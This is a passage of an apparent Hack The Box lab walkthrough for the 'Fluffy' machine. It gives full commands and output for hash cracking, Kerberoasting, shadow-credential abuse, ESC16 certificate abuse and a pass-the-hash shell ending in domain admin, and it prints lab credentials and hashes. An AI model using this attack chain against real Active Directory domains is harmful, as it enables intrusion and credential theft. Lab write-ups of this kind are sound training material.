+P.AGILA::FLUFFY:b3dbfd88351e1847:15407440a3ef41c7b58618569179c465:0101000000000000808d08c6bbbbdc018a226b164ba1eabe0000000002000800500041005300310001001e00570049004e002d0053004b0030004a00590041004800480049005600590004003400570049004e002d0053004b0030004a0059004100480048004900560059002e0050004100530031002e004c004f00430041004c000300140050004100530031002e004c004f00430041004c000500140050004100530031002e004c004f00430041004c0007000800808d08c6bbbbdc01060004000200000008003000300000000000000001000000002000008bba22f24b2400441813d41965452fac8097adb8978201bb13248a4db5b6c8840a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390030000000000000000000:prometheusx-303</code></pre><p>The hash has been cracked</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">p.agila:prometheusx-303</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39;                   
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.88   445    DC01             [+] fluffy.htb\p.agila:prometheusx-303</code></pre><p>I have now compromise this user</p><h2>Kerberoasting</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc ldap dc01.fluffy.htb -u p.agila -p &#39;prometheusx-303&#39; --kerberoasting kerb.hashes
+LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never)
+LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
+LDAP        10.129.232.88   389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.129.232.88   389    DC01             [*] Total of records returned 3
+LDAP        10.129.232.88   389    DC01             [*] sAMAccountName: ca_svc, memberOf: [&#39;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&#39;, &#39;CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb&#39;], pwdLastSet: 2025-04-17 17:07:50.136701, lastLogon: 2025-05-21 23:21:15.969274
+LDAP        10.129.232.88   389    DC01             $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb\ca_svc*$67fcbcd413a96f07b4d498bc4b3e63a4$729ddaec1ac974116a2bd0190e03730360a5d71e519be5a6d6e89430fd759ac32f9e6b3d6f68e04fda69113a5b602e02d72b3f708b79ecb984f0d2ee414924495d95d5adfa9a22ef06e3410237d3777d4636b1f48f2b91064df5604fb56bdd227e5284143b1126e1fb0c39d7a24e6e164fdad45a98d36fb24b03521604b700b21322139718453f6c5014d968088febdae97961ea8e264f953817197094f58f20ad62b2c78381cad722b1a086ac7c7a17820d5e8bd569f85c14eded8370b6b49e855533ab2e9408d6b1111ba55fed78a1dbce7c4d45a74851c6aeb39041cfb6e4309d673f506483fbff6e42df616c689cce72a3c7a60f80a6d90cd7850dde00ad1b600e92c17a6edc1a9ddf303155607bd0cd0bebb15465459562105667db569b2fb01dae1889a9b081f2a093915d978f8e66eae6da9aee1abc7dcff5b029117a7e0c8992f48a3e69f8657c89b7962ce000c9639385db517022a7c458079c6aa5f36c0e48c7cd5d68d18e1e296baebaaed25d1c06801aaf745a2ce0fd13fb42dc06941c5420d5f23ec18c55ff1b67712c91b52d50512da1a4dfa0d074953b8fd010491050d878423c0ad2a95afc0495c8dc977777485069df978a39b539a7df8d37a5f0d9707a65ab90a142dbbbeaff215ce52bc64fd4be94992b43254973dad85f5d4355705a4b3d4c0c93c061b43355075937f32996021cdb305d526bbfcf9432a1d2bca8babaa1cc4854519781ec33039308415ab3f4bfec6ee632a7dfda3b8e2f74955acd08cd4d1242d4c527bf04db5bb8d61a2e40e70da7fcd4c8daad69e3afb2bbeaa1e603860481fdc28e709fa77b0731d048df98e1d70a960e710c1a59ce77b8a987b3878a26b820c9aa7855d2f50a68074c3226c6b363587a3b4312f1ca4ec508c13559fee6ccfb6bb2130137deb6703ab8d3d6cd1048d30e3080e83678757f8253e7746c5d8cf151ead538c4b43d53f2a0eda44db13b7c970077a2f0c7856c16af188c9242bec6936695e6c911ebf39d2ef00de1a2dddfa78ce37972008b531ca9eb728a9f657faaf4ac44b9904eff5b0c9d96f073b94e38cec04b9875b2d9571bf95ec0e833042dedaa7c923569440866bbab279f80623e1d155a3cc7f5131784242738fae14e369d4123d929dbf485b1734e53fdcc1713944437b00adbdbdd7aec87b1ac0e6d54b861664a0ebe17508c079910c7228a1828d7d453b3d8835becff3cc1b032da320e0e5c207dbd05c7097178e7d278b8992ce5aab4a7d560a6efccfb72fb0199619fabe58a0102db9cb0d2eb27b515c00d9d96db701d978117639feba25bb3d552528261aea7c48f7681888f60f2e4568edfafa71691359a8d51a28b2dbc0a8c6cd1fc6ea6731ade6206fb519966c1c031860dac3c6bc2a755d47f9daf0bec5f076c7d80047f21fec36694930e283308c8baf6c862f7d114657ace07c1c036a7bea3ba77e82e7012eb4f63eb3c22611026d7df333a32
+LDAP        10.129.232.88   389    DC01             [*] sAMAccountName: ldap_svc, memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb, pwdLastSet: 2025-04-17 17:17:00.599545, lastLogon: &lt;never&gt;
+LDAP        10.129.232.88   389    DC01             $krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb\ldap_svc*$45c17bdf591b968fac7449b314c65c03$0c071250e2c6a3d9ca179fc321bf31d9cbd3ce7da38cc626cbcb6b80aa43ffa52af373be76a1cb4b6ec164a0c7b114aff064696e6cf91852f132f8474d8c01e4a96a980b6b758ce0f6ca5966c6023eac3ee060d3605ef6e685a637c24407308b3def9cca9dcd2d5e51b4443bb5a4dec1d1bff1da5248d0c4a6d29216b352db1e2085bb3ae5814dd59545053791fd1e6cc8d42cdd45df2ca5309df835e805fbf0184a45e89900ed58906495de244c26eb8946e2eff11815c658adf15d0f9438840c1910968dc17b2fdad29e829e93a17d43c157c4c787bc0c98cf80e9f9acf316802b18a11f1772ac130f6183a1370129a0ef254ee4b847d5df45123429cbf6430181ba4b48b797240866f3c7b416209cabe085711b8af0ee9ad2456f52c8de63845f2f5632e04d49b9dd5a4558c77b04281664ca780e12c2aebbfb069b881485bb251ee12e7b77fda2e535db6295e495ae3aae3fe1a0aef700fbdb558fe42679994b45abe28419ab63351b050428975579ae07fba267ac9331a86ed9ac851b1d1c3efe740b12f579d1e78a04b1849af2a874dc72f969576e9d34fc973e84e7ff43bffd1ef146b7e46fba14a9d329822ed083d77fba2bc96f8ee3ca8e992b107dff6c5ad45954fa698bff98c3a6d4a90323bc207610b0835daec7eb46c52fa4d1c818814dced0820c244a5726ac6bd2891067cf513c4f0c6eb2ab93b11f6c15a8bc2712d0910d25b9141979b6ce30bf9778e7315e53d2403c2bd90b33579594b0306bfc43d505d14b37db08f6276c4fd7b4af24a4b90a430017af7c8d54cbe474279ee52671b845ef4a6cb2927cbb45867adf9d20d4e1d8f37616ece77fd6740a3f91aade4f4902d30198356fe0ee235118262eab7df1f42d3aad7cd11f676768d8797e452cff060659cf974412dc6ff349d16c8d4e787e046bd3e9770d88cc0ce73ca08afc317b8f8d3af9a6af49f4eb3d47e953f15fda9c12854f98717f0969efe30300c9c0057d157a296039e8c65c2006911430fbf92ca7022d6baaba1c6b49ad2a45c7a987a15bfd344ad9136cec9f3a4857a6e4da7d41d4919740f2af1aaf09f53a249adbaac6b1ac958581025098bf62f57c4024754d441d9bd82cf4950903d1cd56440f6c0445127f642fc624ba9cae2f49f280a961b29e86cea76a61f258faaeb1865ffd7c6287217693da37de536c1f18d40bd152f53dace22df030050c9fb743707239bc4d262ba60569afd4a8d318ad7edfc23ad4c044a1fbe9511822a42744755dd2023a5fa562b22134f154f083fd1469dcd641b98abb161c110144e70466097e830f8d2679a5de6b08dbe558cb931d77fcbcd37b22038134634ad30c2da8bd11c75665d245c9b6a5424984151bad8e63822e92f1c4081a1ad1beeef61a15517405dfb9b94fd485a532c3cae4e710f75b08f2f86037278fe8d1b7639fdd3415dfec12d54017235c1975e00d2df1434226d22d0e9d2eaf5db1e2e593
+LDAP        10.129.232.88   389    DC01             [*] sAMAccountName: winrm_svc, memberOf: [&#39;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&#39;, &#39;CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb&#39;], pwdLastSet: 2025-05-18 01:51:16.786913, lastLogon: 2025-05-19 16:13:22.188468
+LDAP        10.129.232.88   389    DC01             $krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb\winrm_svc*$2f0f061aabeaf03f5c447140eb252804$941f7b787309b57acbf73e498367f11edfb20ce60c5906abefd754e5ad0b24d818b9bad14b6306680aab65f733c67a0187e6e37acf4594ef62438d566bde058f1e9c720720683670ea08257180c3aca5605e073525f63623e5a57748c8f28ab724fe214c3c208ee3c83cde04396495c679a0b6354c4e5edf08af62586a2ab5eeeecde057ff4d4e976bacce2b7eacf809be54f92cdd23a18cad5c9de957471f60d19c33f7417974623ed502899c227f406235b81373dc6cfe944d681ba897d2e521758c718b5f4fb4273a72cae9dd729cf303eb05cbc8ddbcb1970ea232690f593fc4a946216af81f3eba27352defa9e832ac45af1bf61926e72c2e9017bb6dbc4513ce5e32778bd990544901043214d141312cc3d50c8fc28596e6bbc1c4d3bcbfb20917d87da36fecbb9c74431c38db27c62417181293fe8214cda2e66c267939b381d55d8d2b81811983b5eeaec9005ccb4a9db88464cc7ad95743811d9de9c6d63070c729449d3a4de412292437966be2d1a676b81fd33051ad0be9f5a35259072c843a6eb97197039b4bed872b2d8734b85105e43a7c9441a578e3337067179de73762529ba3eb2ee617474616bd8bdc93f6ede02f3b2665163ff12bd5d92f08bb0bb2ae798670dd80e7237ced583dd91e255dd48398a0bd271c0d26fc02f8a58aa6fec57fe034631ccf639dd6e882dac5a9f533bc85031be217dc67c553c5b76adb670cfa68e186bbbada813ae1e7311e88e1479e258c6c209f68ce7f63396f34603432b14b9b247699cd0674d34e52421e6fa6a986626a81016f4c55774d40e2bd12d378959eec80e5a787a0519d44ed062171674dc8d21be37196ebc946e08bccc6a03cf2bf3721f063783f4dacc82ff72797d916f0598be930ff2bf742de860e42c43059a19b727264f9e649dd9b72e07299abad6606b22acb5bceacddd1c8de623516fdb1a449181180d181caa71beddeceac43a10ecf852fc451524c3ba928069497db1a6f3c508ddca281415e9d517c43fd4b7dd22bec1f8fe98f3f64413dcb234467232b9dd85129ccd4bf65615b3f4fd0a0c443495a8f42226d668ccf7e8a398f00c0f509c1eba2328745d340eb0f73a31ddfd2cf2855451ce296332321e1467a9ac9c92e5477e9da0fb76d413e8f57207b8381bed26d5c44113eb87cc88f1a72d1b10adc792a5dbb10f21e57c9fd7d28453e120030595159996462502c2b15b8daba85d7189cfaa70979a085070ff3850e79b812cc17adfd453df0a257db4ec0edd84abd37047ff2b73346fc49c11c0908306e1235b664bb60a81f1e4173bffc8f881e25c5b0b559b00169c74ff4923965dcc544ba6dec748b0706be08dc0587ec571fe79a09c9bf1520109db7b2e958f2f65a2d90131bcff06bfe4b8a675ad4c552d8642f3a9c403a3a694c39fe57321bedc508db26da888f25a5c9a4755ee3200f0de00f576fb6523228758a77f25ce0dd1544432957559fd1ca</code></pre><p>Found 3 hashes from kerberoasting</p><p>None of these hashes cracked however</p><h2>Bloodhound</h2><p><img src="images/fluffy/pasted-image-20260406003137.webp" alt="Screenshot" loading="lazy" /> So i have GenericAll over the service accounts group</p><h3>Adding <code>p.agila</code> to service accounts group</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc group addmem &quot;service accounts&quot; &quot;p.agila&quot; -U &quot;fluffy.htb&quot;/&quot;p.agila&quot;%&#39;prometheusx-303&#39; -S &quot;dc01.fluffy.htb&quot;</code></pre><p><img src="images/fluffy/pasted-image-20260406003145.webp" alt="Screenshot" loading="lazy" /> Now im part of the group i have genericWrite over three service accounts</p><p>Since i already tried cracking the kerberos hashes of these users earlier and failed the only option here is to apply shadow credentials</p><h2>Compromising <code>ca_svc</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h certipy-ad shadow auto -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -account &#39;ca_svc&#39; -dc-host dc01.fluffy.htb -debug
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: None
+[+] DC IP: None
+[+] DC Host: &#39;dc01.fluffy.htb&#39;
+[+] Target IP: None
+[+] Remote Name: &#39;dc01.fluffy.htb&#39;
+[+] Domain: &#39;FLUFFY.HTB&#39;
+[+] Username: &#39;P.AGILA&#39;
+[+] Trying to resolve &#39;dc01.fluffy.htb&#39; at &#39;192.168.1.253&#39;
+[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
+Traceback (most recent call last):
+  File &quot;/usr/lib/python3/dist-packages/certipy/lib/target.py&quot;, line 442, in resolve
+    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
+  File &quot;/usr/lib/python3/dist-packages/dns/resolver.py&quot;, line 1306, in resolve
+    (request, answer) = resolution.next_request()
+                        ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File &quot;/usr/lib/python3/dist-packages/dns/resolver.py&quot;, line 750, in next_request
+    raise NXDOMAIN(qnames=self.qnames_to_try, responses=self.nxdomain_responses)
+dns.resolver.NXDOMAIN: The DNS query name does not exist: dc01.fluffy.htb.
+[+] Resolved &#39;dc01.fluffy.htb&#39; from cache: 10.129.232.88
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.232.88:636 - ssl
+[+] Default path: DC=fluffy,DC=htb
+[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb
+[*] Targeting user &#39;ca_svc&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;00d351b27a6248959e069a5582fe9b15&#39;
+[*] Adding Key Credential with device ID &#39;00d351b27a6248959e069a5582fe9b15&#39; to the Key Credentials for &#39;ca_svc&#39;
+[*] Successfully added Key Credential with device ID &#39;00d351b27a6248959e069a5582fe9b15&#39; to the Key Credentials for &#39;ca_svc&#39;
+[*] Authenticating as &#39;ca_svc&#39; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &#39;ca_svc@fluffy.htb&#39;
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC fluffy.htb (10.129.232.88)
+[*] Got TGT
+[*] Saving credential cache to &#39;ca_svc.ccache&#39;
+[+] Attempting to write data to &#39;ca_svc.ccache&#39;
+[+] Data written to &#39;ca_svc.ccache&#39;
+[*] Wrote credential cache to &#39;ca_svc.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;ca_svc&#39;
+[*] Restoring the old Key Credentials for &#39;ca_svc&#39;
+[*] Successfully restored the old Key Credentials for &#39;ca_svc&#39;
+[*] NT hash for &#39;ca_svc&#39;: ca0f4f9e9eb8a092addf53bb03fc98c8</code></pre><p>So there is a cleanup script running so after adding the user to the group and checking i had disappeared so i had to re-add myself then quickly run this command</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.fluffy.htb -u ca_svc -H ca0f4f9e9eb8a092addf53bb03fc98c8                                   
+LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never)
+LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8 </code></pre><p>This user has been compromised</p><h2>ADCS</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad find -u ca_svc@fluffy.htb -hashes &#39;:ca0f4f9e9eb8a092addf53bb03fc98c8&#39; -dc-ip 10.129.232.88 -vulnerable -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &#39;fluffy-DC01-CA&#39; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &#39;fluffy-DC01-CA&#39;
+[*] Checking web enrollment for CA &#39;fluffy-DC01-CA&#39; @ &#39;DC01.fluffy.htb&#39;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates</code></pre><p>From this output its clear to see that its vulnerable to ESC16</p><h3>ESC16</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad account -u &#39;ca_svc@fluffy.htb&#39; -hashes &#39;:ca0f4f9e9eb8a092addf53bb03fc98c8&#39; -dc-ip &#39;10.129.232.88&#39; -upn &#39;administrator&#39; -user &#39;ca_svc&#39; update
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user &#39;ca_svc&#39;:
+    userPrincipalName                   : administrator
+[*] Successfully updated &#39;ca_svc&#39;</code></pre><p>This updated the UPN of the <code>ca_svc</code> user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h certipy-ad req -u &#39;ca_svc@fluffy.htb&#39; -hashes &#39;:ca0f4f9e9eb8a092addf53bb03fc98c8&#39; -dc-ip &#39;10.129.232.88&#39; -target &#39;dc01.fluffy.htb&#39; -ca &#39;fluffy-DC01-CA&#39; -template &#39;User&#39;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 17
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;administrator&#39;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+[*] Wrote certificate and private key to &#39;administrator.pfx&#39;</code></pre><p>Here i request the certificate</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88 -u &#39;administrator&#39; -domain &#39;fluffy.htb&#39;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;administrator&#39;
+[*] Using principal: &#39;administrator@fluffy.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[*] Wrote credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</code></pre><p>Now i can dump the hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc01.fluffy.htb -u administrator -H &#39;8da83a3fa618b6e3a00e93f676c92a6e&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../../winrm_svc
+*Evil-WinRM* PS C:\Users\winrm_svc&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; type user.txt
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; cd ../../Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-flight/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Flight</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-rebound/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Rebound</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
